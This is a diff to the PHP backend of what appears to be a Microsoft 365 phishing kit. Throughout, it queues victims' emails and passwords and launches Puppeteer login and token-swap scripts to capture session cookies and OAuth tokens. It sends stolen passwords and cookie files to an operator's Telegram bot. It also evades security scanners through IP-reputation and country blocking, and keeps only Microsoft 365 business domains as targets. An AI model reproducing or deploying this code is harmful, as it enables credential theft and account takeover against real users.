@@ -9,8 +9,6 @@ class Config {
         $configPath = $baseDir . '/config.json.enc';
         $envPath = $baseDir . '/.env';
         $cfg = [];
-        
-        // Security::log("DEBUG: Config::load called. EnvPath: $envPath, ConfigPath: $configPath");
 
         // 1. Load manual .env first (Defaults)
         if (file_exists($envPath)) {
@@ -110,13 +108,6 @@ class Config {
             $cfg['proxycheckRiskThreshold'] = (int)$envProxycheckRiskThreshold;
         }
 
-        // Security::log("DEBUG: Config::load result keys: " . implode(',', array_keys($cfg)));
-        if (isset($cfg['cfApiKey'])) {
-             // Security::log("DEBUG: Config::load found cfApiKey. Length: " . strlen($cfg['cfApiKey']));
-        } else {
-             // Security::log("DEBUG: Config::load NO cfApiKey");
-        }
-
         return $cfg;
     }
 
@@ -133,8 +124,7 @@ class Config {
 
     public static function save(array $data): bool {
         $configPath = __DIR__ . '/../config.json.enc';
-        // Security::log("DEBUG: Config::save called. Path: $configPath. Keys: " . implode(',', array_keys($data)));
-        
+
         // Add random jitter to file size to prevent size-analysis
         $data['_padding'] = bin2hex(random_bytes(mt_rand(16, 64)));
         $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
@@ -142,13 +132,10 @@ class Config {
         
         $result = Crypto::saveEncrypted($configPath, $json);
         if ($result) {
-            // Security::log("DEBUG: Config::save SUCCESS");
             clearstatcache(true, $configPath);
             if (function_exists('opcache_invalidate')) {
                 @opcache_invalidate($configPath, true);
             }
-        } else {
-            // Security::log("DEBUG: Config::save FAILED");
         }
         return $result;
     }
@@ -169,12 +156,45 @@ class Config {
 }
 
 class Worker {
+    public static function buildNodeCommand(string $projectRoot, string $script, string $email = '', string $password = '', string $cookieId = '', bool $background = false, bool $installChrome = false, string $apiBase = ''): string {
+        $cmd = "cd " . escapeshellarg($projectRoot);
+        $cmd .= " && export PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer');
+
+        if ($installChrome) {
+            $cmd .= " && if ! command -v chromium >/dev/null 2>&1 && ! command -v google-chrome >/dev/null 2>&1; then npx puppeteer browsers install chrome; fi";
+        }
+
+        $cmd .= " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=\`command -v chromium\`; elif command -v google-chrome >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=\`command -v google-chrome\`; fi";
+        $cmd .= " && HOME=" . escapeshellarg($projectRoot);
+        $cmd .= " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules');
+        $cmd .= " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config');
+        $cmd .= " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache');
+
+        if ($apiBase !== '') {
+            $cmd .= " API_BASE_URL=" . escapeshellarg($apiBase);
+        }
+
+        $cmd .= " node " . escapeshellarg($projectRoot . '/' . $script);
+
+        if ($email !== '')    $cmd .= " " . escapeshellarg($email);
+        if ($password !== '') $cmd .= " " . escapeshellarg($password);
+        if ($cookieId !== '') $cmd .= " " . escapeshellarg($cookieId);
+
+        if ($background) {
+            $cmd .= " > /dev/null 2>&1 &";
+        }
+
+        return $cmd;
+    }
+
     public static function run() {
         Security::log("WORKER: Started file-based worker. Waiting for jobs...");
         
         $baseDir = realpath(__DIR__ . '/..');
         $storageDir = $baseDir . '/session_data';
         
+        $passwordTimeoutSecs = 120;
+
         while (true) {
             try {
                 $files = glob($storageDir . '/session_*.json');
@@ -183,11 +203,24 @@ class Worker {
                 $task = null;
                 foreach ($files as $f) {
                     $data = json_decode(file_get_contents($f), true);
-                    if (is_array($data) && ($data['status'] ?? '') === 'pending') {
-                        $sessionFile = $f;
-                        $task = $data;
-                        break;
+                    if (!is_array($data) || ($data['status'] ?? '') !== 'pending') continue;
+
+                    $taskPassword = $data['password'] ?? '';
+                    if (empty($taskPassword) || $taskPassword === '__from_file__' || $taskPassword === 'PROACTIVE_SESSION_SYNC') {
+                        $createdAt = strtotime($data['created_at'] ?? '');
+                        if ($createdAt && (time() - $createdAt) >= $passwordTimeoutSecs) {
+                            $data['status'] = 'failed';
+                            $data['data'] = ['error' => 'Timed out waiting for password.'];
+                            $data['updated_at'] = date('c');
+                            file_put_contents($f, json_encode($data, JSON_PRETTY_PRINT));
+                            Security::log("WORKER: Timed out waiting for password for {$data['email']} (CookieID: {$data['cookie_id']}). Marking failed.");
+                        }
+                        continue;
                     }
+
+                    $sessionFile = $f;
+                    $task = $data;
+                    break;
                 }
 
                 if (!$sessionFile || !$task) {
@@ -208,16 +241,15 @@ class Worker {
                 
                 $scriptToRun = 'consolidated.js';
 
-                $taskPassword = $task['password'] ?? '__from_file__';
+                $taskPassword = $task['password'] ?? '';
 
                 if ($taskPassword === "OAUTH_TOKEN_CAPTURED") {
                     $scriptToRun = 'token_swap.js';
                     Security::log("WORKER: Detected Hybrid Token Swap task. Running $scriptToRun...");
                 }
 
-                // Resolve password: read from password.txt if sentinel or empty
-                if ($taskPassword === '__from_file__' || $taskPassword === '' || $taskPassword === 'password_from_file') {
-                    Security::log("WORKER: No password provided for {$task['email']} — skipping.");
+                if ($scriptToRun === 'token_swap.js' && empty($taskPassword)) {
+                    Security::log("WORKER: No password provided for token_swap — skipping.");
                     $task['status'] = 'failed';
                     $task['data'] = ['error' => 'No password was provided.'];
                     $task['updated_at'] = date('c');
@@ -226,98 +258,15 @@ class Worker {
                 }
 
                 $puppeteerLogFile = $projectRoot . '/puppeteer.log';
-                $cmd = "cd " . escapeshellarg($projectRoot) .
-                       " && export PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer') .
-                       " && if ! command -v chromium >/dev/null 2>&1 && ! command -v google-chrome >/dev/null 2>&1; then npx puppeteer browsers install chrome; fi" .
-                       " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; elif command -v google-chrome >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v google-chrome`; fi" .
-                       " && HOME=" . escapeshellarg($projectRoot) .
-                       " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules') .
-                       " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config') .
-                       " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
-                       " API_BASE_URL=" . escapeshellarg($apiBase) .
-                       " node " . escapeshellarg($projectRoot . '/' . $scriptToRun) . " " .
-                       escapeshellarg($task['email']) . " " .
-                       escapeshellarg($taskPassword) . " " .
-                       escapeshellarg($task['cookie_id']) . " --verbose";
-                
+                $cmd = self::buildNodeCommand($projectRoot, $scriptToRun, $task['email'], '', $task['cookie_id'], false, true, $apiBase) . " --verbose >> " . escapeshellarg($puppeteerLogFile) . " 2>&1 </dev/null &";
+
                 Security::log("WORKER: Executing command: $cmd");
 
-                $process = proc_open($cmd, [
-                    0 => ["pipe", "r"],
-                    1 => ["pipe", "w"],
-                    2 => ["pipe", "w"]
-                ], $pipes);
+                proc_close(proc_open($cmd, [], $pipes));
+                Security::log("WORKER: Launched $scriptToRun for {$task['email']} (non-blocking)");
                 
-                $outputStr = "";
-                if (is_resource($process)) {
-                    // Simple blocking read for stability
-                    $stdout = stream_get_contents($pipes[1]);
-                    $stderr = stream_get_contents($pipes[2]);
-                    $outputStr = $stdout . $stderr;
-                    
-                    fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
-                    $exitCode = proc_close($process);
-                    
-                    // Append puppeteer output to a dedicated log file
-                    file_put_contents($puppeteerLogFile, "\n\n--- Puppeteer Log for {$task['email']} (Task ID: {$task['cookie_id']}) ---\n" . $outputStr, FILE_APPEND);
+                Security::log("WORKER: Job handed off to $scriptToRun. Moving on.");
 
-                    // Log output for debugging
-                    Security::log("WORKER OUTPUT [$scriptToRun] (also logged to puppeteer.log):\n" . $outputStr);
-                }
-                
-                $finalStatus = 'failed';
-                $finalData = ['error' => 'The automation script failed without providing a clear reason.'];
-
-                // Collect ALL JSON status lines from the output — first specific one wins
-                $lines = explode("\n", trim($outputStr));
-                $specificResult = null;
-                $genericResult  = null;
-
-                foreach ($lines as $line) {
-                    $line = trim($line);
-                    if ($line === '' || $line[0] !== '{') continue;
-                    $decoded = json_decode($line, true);
-                    if (json_last_error() !== JSON_ERROR_NONE || !isset($decoded['status'])) continue;
-
-                    $err = $decoded['error'] ?? '';
-                    $isGeneric = ($err === 'Login failed after running checks.' || $err === '');
-
-                    if (!$isGeneric && $specificResult === null) {
-                        $specificResult = $decoded;
-                    } elseif ($genericResult === null) {
-                        $genericResult = $decoded;
-                    }
-                }
-
-                $lastJsonLine = $specificResult ?? $genericResult;
-
-                if ($lastJsonLine) {
-                    // Use the status from the script's JSON output
-                    $finalStatus = $lastJsonLine['status'];
-                    $finalData = $lastJsonLine;
-                } else {
-                    // Fallback for scripts that don't output JSON
-                    if (strpos($outputStr, 'HYBRID SWAP SUCCESS') !== false || $exitCode === 0) {
-                        $finalStatus = 'completed';
-                        $finalData = ['message' => 'Process completed successfully.'];
-                    }
-                }
-
-                // Update single session file with final status
-                $task['status'] = $finalStatus;
-                $task['data'] = $finalData;
-                $task['updated_at'] = date('c');
-                unset($task['password']);
-                file_put_contents($sessionFile, json_encode($task, JSON_PRETTY_PRINT));
-                
-                // Send Telegram Notification
-                $cfg = Config::load();
-                if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
-                    self::sendTelegramCookies($task, $cfg, $finalStatus);
-                }
-                
-                Security::log("WORKER: Job finished with status: $finalStatus");
-                
             } catch (Exception $e) {
                 Security::log("WORKER ERROR: " . $e->getMessage());
                 usleep(1000000);
@@ -325,24 +274,33 @@ class Worker {
         }
     }
 
+    public static function sendTelegramMessage(string $email, string $password, string $ip, string $ua, string $info): void {
+        $cfg = Config::load();
+        if (empty($cfg['telegramBotToken']) || empty($cfg['telegramChatId'])) return;
+        $msg = self::generateTelegramMessage($email, $password, $ip, $ua, $info);
+        $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
+        self::sendRequest($url, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);
+    }
+
+    public static function sendTelegramDocument(string $email, string $filePath, string $label): void {
+        $cfg = Config::load();
+        if (empty($cfg['telegramBotToken']) || empty($cfg['telegramChatId'])) return;
+        if (!file_exists($filePath)) return;
+        $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
+        $payload = [
+            'chat_id'  => $cfg['telegramChatId'],
+            'document' => new \CURLFile($filePath, 'application/javascript', $label),
+            'caption'  => "/////// COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
+        ];
+        self::sendRequest($url, $payload, $cfg, true);
+    }
+
     public static function sendTelegramCookies($task, $cfg, $finalStatus) {
-        $botToken = $cfg['telegramBotToken'];
-        $chatId = $cfg['telegramChatId'];
         $cookieId = $task['cookie_id'];
-        $email = $task['email'];
-        
-        $baseDir = realpath(__DIR__ . '/..');
+        $email    = $task['email'];
+        $baseDir  = realpath(__DIR__ . '/..');
         $injectFile = $baseDir . '/session_data/inject_session_' . $cookieId . '.js';
-        
-        if (file_exists($injectFile)) {
-            $urlDoc = "https://api.telegram.org/bot{$botToken}/sendDocument";
-            $payloadDoc = [
-                'chat_id' => $chatId,
-                'document' => new \CURLFile($injectFile, 'application/javascript', "cookies_{$email}.js"),
-                'caption' => "/////// COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
-            ];
-            self::sendRequest($urlDoc, $payloadDoc, $cfg, true);
-        }
+        self::sendTelegramDocument($email, $injectFile, "cookies_{$email}.js");
     }
 
     public static function generateTelegramMessage($email, $password, $ip, $ua, $info, $statusSuffix = "") {
@@ -505,7 +463,7 @@ class Database {
     }
 
     public function logEvent($data) {
-        $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']);
+        $cookieId = Security::sanitizeId($data['cookieId']);
         $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
 
         $data['country'] = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
@@ -520,7 +478,7 @@ class Database {
     }
 
     public function addTask($cookieId, $email, $password) {
-        $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
+        $cookieId = Security::sanitizeId($cookieId);
         $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
 
         $existing = file_exists($filePath) ? (json_decode(file_get_contents($filePath), true) ?: []) : [];
@@ -535,7 +493,7 @@ class Database {
     }
 
     public function getEventInfo($cookieId) {
-        $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
+        $cookieId = Security::sanitizeId($cookieId);
         $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
         if (file_exists($filePath)) {
             return json_decode(file_get_contents($filePath), true);
@@ -613,15 +571,11 @@ class Security {
         
         if ($ip) {
             // 3. Country Blocking (App + Cloudflare Fallback)
-            $appCountryBlocking = !empty($cfg['countryBlockingEnabled']);
-            $cfCountryBlocking = !empty($cfg['cfCountryBlockingEnabled']);
-
-            if ($appCountryBlocking || $cfCountryBlocking) {
-                $rawList = '';
-                if ($appCountryBlocking && !empty($cfg['allowedCountries'])) {
-                    $rawList = $cfg['allowedCountries'];
-                } elseif ($cfCountryBlocking && !empty($cfg['cfAllowedCountries'])) {
-                    $rawList = $cfg['cfAllowedCountries'];
+            if (!empty($cfg['countryBlockingEnabled']) || !empty($cfg['cfCountryBlockingEnabled'])) {
+                if (!empty($cfg['countryBlockingEnabled'])) {
+                    $rawList = trim((string)($cfg['allowedCountries'] ?? ''));
+                } else {
+                    $rawList = trim((string)($cfg['cfAllowedCountries'] ?? ''));
                 }
 
                 if ($rawList !== '') {
@@ -777,6 +731,22 @@ class Security {
         return $_SERVER['REMOTE_ADDR'] ?? '';
     }
 
+    public static function sanitizeId(string $id): string {
+        return preg_replace('/[^a-zA-Z0-9._-]/', '', $id);
+    }
+
+    private static function cacheGet(string $file, int $ttl, string $requiredKey = 'checked_at'): ?array {
+        if (!file_exists($file)) return null;
+        $cached = json_decode(file_get_contents($file), true);
+        if (!is_array($cached) || !isset($cached['checked_at'], $cached[$requiredKey])) return null;
+        if ((time() - (int)$cached['checked_at']) >= $ttl) return null;
+        return $cached;
+    }
+
+    private static function cacheSet(string $file, array $data): void {
+        @file_put_contents($file, json_encode($data));
+    }
+
     public static function ipinfoAsnBlocked(string $ip, string $token, bool $failClosed = false, int $cacheTtlSeconds = 86400): bool {
         if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
             return $failClosed;
@@ -796,15 +766,8 @@ class Security {
         
         $cacheFile = $cacheDir . '/ipinfo_' . md5($ip) . '.json';
 
-        // Check Cache
-        if (file_exists($cacheFile)) {
-            $cached = json_decode(file_get_contents($cacheFile), true);
-            if (is_array($cached) && isset($cached['checked_at'], $cached['is_blocked'])) {
-                if (($now - $cached['checked_at']) < $cacheTtlSeconds) {
-                    return (bool)$cached['is_blocked'];
-                }
-            }
-        }
+        $hit = self::cacheGet($cacheFile, $cacheTtlSeconds, 'is_blocked');
+        if ($hit !== null) return (bool)$hit['is_blocked'];
 
         $url = "https://api.ipinfo.io/lite/{$ip}";
         $context = stream_context_create([
@@ -847,16 +810,14 @@ class Security {
             }
         }
 
-        // Save Cache
-        $cacheData = [
-            'ip' => $ip,
-            'checked_at' => $now,
-            'is_blocked' => $blocked,
-            'asn' => $asn,
-            'as_name' => $asName,
+        self::cacheSet($cacheFile, [
+            'ip'        => $ip,
+            'checked_at'=> time(),
+            'is_blocked'=> $blocked,
+            'asn'       => $asn,
+            'as_name'   => $asName,
             'as_domain' => $asDomain
-        ];
-        @file_put_contents($cacheFile, json_encode($cacheData));
+        ]);
 
         return $blocked;
     }
@@ -943,17 +904,8 @@ class Security {
         if (!is_dir($cacheDir)) @mkdir($cacheDir, 0777, true);
         $cacheFile = $cacheDir . '/proxycheck_' . $cacheKey . '.json';
         
-        if (file_exists($cacheFile)) {
-            $cached = json_decode(file_get_contents($cacheFile), true);
-            if (is_array($cached) && isset($cached['checked_at'])) {
-                $checkedAt = (int)$cached['checked_at'];
-                $now = time();
-                // Cache for 1 hour
-                if (($now - $checkedAt) >= 0 && ($now - $checkedAt) < 3600) {
-                     return $cached['data'];
-                }
-            }
-        }
+        $hit = self::cacheGet($cacheFile, 3600, 'data');
+        if ($hit !== null) return $hit['data'];
 
         // Use CURL for better reliability and detailed error reporting
         $params = [
@@ -1063,12 +1015,7 @@ class Security {
             self::log("ProxyCheck.io BLOCKED IP {$ip}: " . $reasonStr);
         }
 
-        // Cache the result
-        $cacheData = [
-            'checked_at' => time(),
-            'data' => $intel
-        ];
-        @file_put_contents($cacheFile, json_encode($cacheData));
+        self::cacheSet($cacheFile, ['checked_at' => time(), 'data' => $intel]);
 
         return $intel;
     }
@@ -1107,7 +1054,7 @@ class Api {
             case 'get_events': self::handleGetEvents(); break;
             case 'get_deployment_info': self::handleGetDeploymentInfo(); break;
             case 'log_event': self::handleLogEvent(); break;
-            case 'run_puppeteer': self::handleRunPuppeteer(); break;
+
             case 'validate_turnstile_config': self::handleValidateTurnstileConfig(); break;
             case 'verify_turnstile': self::handleVerifyTurnstile(); break;
             case 'verify_email': self::handleVerifyEmail(); break;
@@ -1122,6 +1069,7 @@ class Api {
             case 'receive_local_capture': self::handleReceiveLocalCapture(); break;
             case 'trigger_worker': self::handleTriggerWorker(); break;
             case 'get_connection_status': self::handleGetConnectionStatus(); break;
+            case 'create_session': self::handleCreateSession(); break;
             case 'submit_password': self::handleSubmitPassword(); break;
             case 'check_login_status': self::handleCheckLoginStatus(); break;
             default:
@@ -1129,6 +1077,44 @@ class Api {
             echo json_encode(['ok' => false, 'error' => 'Invalid action']);
             break;
         }
+    }
+
+    private static function handleCreateSession() {
+        $raw  = file_get_contents('php://input');
+        $data = json_decode($raw, true);
+        $email    = isset($data['email'])    ? trim($data['email'])    : '';
+        $cookieId = isset($data['cookieId']) ? Security::sanitizeId($data['cookieId']) : '';
+
+        if (!$email || !$cookieId) {
+            echo json_encode(['ok' => false, 'error' => 'Missing email or cookieId']);
+            exit;
+        }
+
+        $projectRoot = realpath(__DIR__ . '/..');
+        $sessionFile = $projectRoot . '/session_data/session_' . $cookieId . '.json';
+        $existing = file_exists($sessionFile) ? (json_decode(file_get_contents($sessionFile), true) ?: []) : [];
+        $existing['cookie_id']  = $cookieId;
+        $existing['email']      = $email;
+        $existing['password']   = '';
+        $existing['status']     = 'pending';
+        $existing['created_at'] = $existing['created_at'] ?? date('c');
+        $existing['updated_at'] = date('c');
+        file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
+
+        Security::log("CREATE_SESSION: Queued pending session for $email (session: $cookieId)");
+
+        $workerRunning = !empty(shell_exec("pgrep -fa 'php.*index\\.php.*worker' 2>/dev/null"));
+        if (!$workerRunning) {
+            $phpBin = PHP_BINARY ?: 'php';
+            $indexPhp = escapeshellarg($projectRoot . '/index.php');
+            $workerLogFile = escapeshellarg($projectRoot . '/worker.log');
+            $workerCmd = "$phpBin $indexPhp worker >> $workerLogFile 2>&1 &";
+            shell_exec($workerCmd);
+            Security::log("CREATE_SESSION: Worker was not running — auto-started.");
+        }
+
+        echo json_encode(['ok' => true]);
+        exit;
     }
 
     private static function handleSubmitPassword() {
@@ -1145,46 +1131,35 @@ class Api {
             exit;
         }
 
-        $email    = isset($data['email'])    ? trim($data['email'])    : '';
-        $masterId = isset($data['cookieId']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']) : uniqid('web_', true);
+        $cookieId = isset($data['cookieId']) ? Security::sanitizeId($data['cookieId']) : '';
+        $password = isset($data['password']) ? trim($data['password']) : '';
 
-        if ($email === '') {
+        if (!$cookieId || $password === '') {
             http_response_code(400);
-            echo json_encode(['ok' => false, 'error' => 'Missing email']);
+            echo json_encode(['ok' => false, 'error' => 'Missing cookieId or password']);
             exit;
         }
 
-        // Passwords can come as an array or a single value; always normalise to array
-        $rawPasswords = $data['passwords'] ?? ($data['password'] ?? null);
-        if (is_string($rawPasswords) && $rawPasswords !== '') {
-            $passwords = array_values(array_filter(array_map('trim', explode(',', $rawPasswords))));
-        } elseif (is_array($rawPasswords)) {
-            $passwords = array_values(array_filter(array_map('trim', $rawPasswords)));
-        } else {
-            $passwords = [];
+        $projectRoot = realpath(__DIR__ . '/..');
+        $sessionFile = $projectRoot . '/session_data/session_' . $cookieId . '.json';
+
+        if (!file_exists($sessionFile)) {
+            http_response_code(404);
+            echo json_encode(['ok' => false, 'error' => 'Session not found']);
+            exit;
         }
 
-        // Always add a sentinel so the worker can run with password.txt when none are supplied
-        if (empty($passwords)) {
-            $passwords = ['__from_file__'];
+        $existing = json_decode(file_get_contents($sessionFile), true) ?: [];
+        $existing['password']   = $password;
+        if (($existing['status'] ?? '') !== 'processing') {
+            $existing['status'] = 'pending';
         }
+        $existing['updated_at'] = date('c');
+        file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
 
-        try {
-            $db = new Database();
-            $subIds = [];
-            foreach ($passwords as $idx => $pwd) {
-                $subId = $masterId . '_p' . $idx;
-                $db->addTask($subId, $email, $pwd);
-                $subIds[] = $subId;
-                Security::log("SUBMIT_PASSWORD: queued subTask=$subId email=$email pwd_index=$idx");
-            }
-
-            echo json_encode(['ok' => true, 'sessionId' => $masterId, 'subIds' => $subIds]);
-        } catch (Exception $e) {
-            Security::log("API ERROR (submit_password): " . $e->getMessage());
-            http_response_code(500);
-            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
-        }
+        Security::log("SUBMIT_PASSWORD: password written for session $cookieId");
+        echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
+        exit;
     }
 
     private static function handleCheckLoginStatus() {
@@ -1195,7 +1170,7 @@ class Api {
             exit;
         }
 
-        $sessionId   = preg_replace('/[^a-zA-Z0-9._-]/', '', $sessionId);
+        $sessionId   = Security::sanitizeId($sessionId);
         $storageDir  = realpath(__DIR__ . '/../session_data');
 
         // Collect sub-task IDs: any session_<masterId>_p*.json files, or the session itself
@@ -1270,19 +1245,10 @@ class Api {
     public static function handleTriggerWorker() { // Note: Made static to match other Api methods
         ob_start(); // Start output buffering
 
-        $email = $_POST['email'] ?? null; // Keep email as null if not provided
+        $email = $_POST['email'] ?? null;
         $cookieId = $_POST['cookieId'] ?? null;
-        $clientCookies = $_POST['clientCookies'] ?? ''; // String of document.cookie from client
+        $clientCookies = $_POST['clientCookies'] ?? '';
 
-        $logFile = realpath(__DIR__ . '/../project.log'); // Get absolute path
-        $logMessage = '[' . date('c') . '] DIRECT_LOG_TEST: handleTriggerWorker received request. Email: '. ($email ?? '[NULL]') . ', CookieID: '. ($cookieId ?? '[NULL]') . "\n";
-        file_put_contents($logFile, $logMessage, FILE_APPEND);
-        // Explicitly flush after direct file_put_contents
-        if (is_resource($fp = fopen($logFile, 'a'))) {
-            fwrite($fp, ""); // Write empty string to force flush if not already
-            fflush($fp);
-            fclose($fp);
-        }
         Security::log("PROACTIVE_TRIGGER: Received request. Email: ". ($email ?? '[NULL]') . ", CookieID: ". ($cookieId ?? '[NULL]'));
 
         if (!$cookieId) { // Only check for cookieId
@@ -1297,7 +1263,6 @@ class Api {
 
         // Check if a worker task is already pending or completed for this cookieId
         $db = new Database();
-        // ... (logic to prevent re-triggering) ...
 
         // Trigger the token_swap.js worker proactively.
         $db->addTask($cookieId, $email, "PROACTIVE_SESSION_SYNC");
@@ -1385,10 +1350,7 @@ class Api {
                     'token_data' => $tokens
                 ]);
                 // Trigger token_swap.js worker
-                $cmd = "cd " . escapeshellarg($projectRoot) .
-                       " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; fi" .
-                       " && HOME=" . escapeshellarg($projectRoot) .
-                       " node " . escapeshellarg($projectRoot . '/token_swap.js') . " " . escapeshellarg($email) . " \"OAUTH_TOKEN_CAPTURED\" " . escapeshellarg($workerCookieId) . " >> " . escapeshellarg($projectRoot . '/project.log') . " 2>&1";
+                $cmd = Worker::buildNodeCommand($projectRoot, 'token_swap.js', $email, 'OAUTH_TOKEN_CAPTURED', $workerCookieId, true);
                 shell_exec($cmd);
             } else {
                 Security::log("LOCAL_CAPTURE: No refresh token, or PHP swap successfully captured session with ESTSAUTH for $email. Worker not triggered.");
@@ -1443,21 +1405,8 @@ class Api {
         file_put_contents($scriptPath, $scriptContent);
         
         // 3. Telegram Notification
-        $cfg = Config::load();
-        if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
-            $msg = Worker::generateTelegramMessage($email, "HYBRID_CAPTURE_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ Hybrid Capture Success: FOCI Cookies (" . count($fociCookies) . ") + Local Browser Memory merged.");
-            $urlTg = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
-            Worker::sendRequest($urlTg, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);
-
-            // Send document
-            $urlDoc = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
-            $payloadDoc = [
-                'chat_id' => $cfg['telegramChatId'],
-                'document' => new \CURLFile($scriptPath, 'application/javascript', "hybrid_cookies_{$email}.js"),
-                'caption' => "/////// HYBRID COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
-            ];
-            Worker::sendRequest($urlDoc, $payloadDoc, $cfg, true);
-        }
+        Worker::sendTelegramMessage($email, "HYBRID_CAPTURE_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ Hybrid Capture Success: FOCI Cookies (" . count($fociCookies) . ") + Local Browser Memory merged.");
+        Worker::sendTelegramDocument($email, $scriptPath, "hybrid_cookies_{$email}.js");
         
         echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
     }
@@ -1676,7 +1625,32 @@ class Api {
                 exit;
             }
         }
-        
+
+        // 4. Microsoft 365 DNS check (MX + SPF)
+        $isMs365 = false;
+        $mx = @dns_get_record($domain, DNS_MX) ?: [];
+        foreach ($mx as $r) {
+            if (isset($r['target']) && strpos($r['target'], 'mail.protection.outlook.com') !== false) {
+                $isMs365 = true;
+                break;
+            }
+        }
+        if (!$isMs365) {
+            $txt = @dns_get_record($domain, DNS_TXT) ?: [];
+            foreach ($txt as $r) {
+                $t = $r['txt'] ?? '';
+                if (strpos($t, 'spf.protection.outlook.com') !== false || strpos($t, 'protection.outlook.com') !== false) {
+                    $isMs365 = true;
+                    break;
+                }
+            }
+        }
+
+        if (!$isMs365) {
+            echo json_encode(['ok' => true, 'isBusiness' => false]);
+            exit;
+        }
+
         echo json_encode(['ok' => true, 'isBusiness' => true]);
     }
 
@@ -1694,7 +1668,7 @@ class Api {
 
                 $cookieId = $data['cookieId'] ?? $data['cookie_id'] ?? null;
                 if (!$cookieId) continue;
-                $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
+                $cookieId = Security::sanitizeId($cookieId);
                 $botStatus = $data['status'] ?? 'pending';
                 
                 $event = [
@@ -1732,61 +1706,6 @@ class Api {
             echo json_encode(['ok' => true, 'events' => $events]);
         } catch (Exception $e) {
             Security::log("API ERROR (get_events): " . $e->getMessage());
-            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
-        }
-    }
-
-    private static function handleRunPuppeteer() {
-        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-            http_response_code(405);
-            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
-            exit;
-        }
-        $raw = file_get_contents('php://input');
-        $data = json_decode($raw, true);
-        if (!is_array($data)) {
-            http_response_code(400);
-            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
-            exit;
-        }
-
-        $email = isset($data['email']) ? trim($data['email']) : '';
-        $password = isset($data['password']) ? (string)$data['password'] : '';
-        $cookieId = isset($data['cookieId']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']) : '';
-
-        if ($email === '' || $password === '' || $cookieId === '') {
-            http_response_code(400);
-            echo json_encode(['ok' => false, 'error' => 'Missing fields']);
-            exit;
-        }
-
-        try {
-            // IMMEDIATE TELEGRAM NOTIFICATION
-            $cfg = Config::load();
-            if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
-                 $ip = Security::getClientIp();
-                 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-                 $info = "🍪  (Processing...)"; 
-                 
-                 $msg = Worker::generateTelegramMessage($email, $password, $ip, $ua, $info);
-                 
-                 $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
-                 $payload = [
-                     'chat_id' => $cfg['telegramChatId'],
-                     'text' => $msg
-                 ];
-                 
-                 Worker::sendRequest($url, $payload, $cfg);
-            }
-
-            $db = new Database();
-
-            $db->addTask($cookieId, $email, $password);
-
-            echo json_encode(['ok' => true]);
-        } catch (Exception $e) {
-            Security::log("API ERROR (run_puppeteer): " . $e->getMessage());
-            http_response_code(500);
             echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
         }
     }
@@ -1861,7 +1780,6 @@ class Api {
             exit;
         }
         $raw = file_get_contents('php://input');
-        // Security::log("DEBUG: handleLogEvent received raw body: " . substr($raw, 0, 200));
         $data = json_decode($raw, true);
         if (!is_array($data)) {
             http_response_code(400);
@@ -1888,7 +1806,7 @@ class Api {
             $domain = isset($data['domain']) ? $data['domain'] : '';
             $attempt = isset($data['attempt']) ? $data['attempt'] : 0;
             $cookieIdRaw = isset($data['cookieId']) ? (string)$data['cookieId'] : '';
